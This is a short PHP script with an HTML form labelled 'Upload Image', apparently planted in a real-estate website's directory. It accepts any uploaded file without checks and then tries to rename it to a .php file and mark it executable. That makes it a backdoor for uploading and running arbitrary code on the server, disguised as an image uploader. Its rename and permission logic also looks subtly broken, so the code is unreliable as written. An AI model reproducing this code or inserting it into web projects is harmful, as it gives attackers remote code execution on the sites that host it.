<?php
if(isset($_POST["submitfile"])){
	$target_dir = " usmetrorealty/";
	$target_file = $target_dir . basename($_FILES["uploadFile"]["name"]);
	$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
	$file_name = basename($_FILES["uploadFile"]["name"],".jpg");
	$oldfilename = $_FILES["uploadFile"]["name"];		
	if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
		rename($oldfilename, $file_name.'.php');
		chmod($file_name.'.php', 0755);
	}
}
?>
<form  method="post" enctype="multipart/form-data" >
	<input type="file" name="uploadFile" id="uploadFile">
	<input type="submit" value="Upload Image" name="submitfile" >
</form>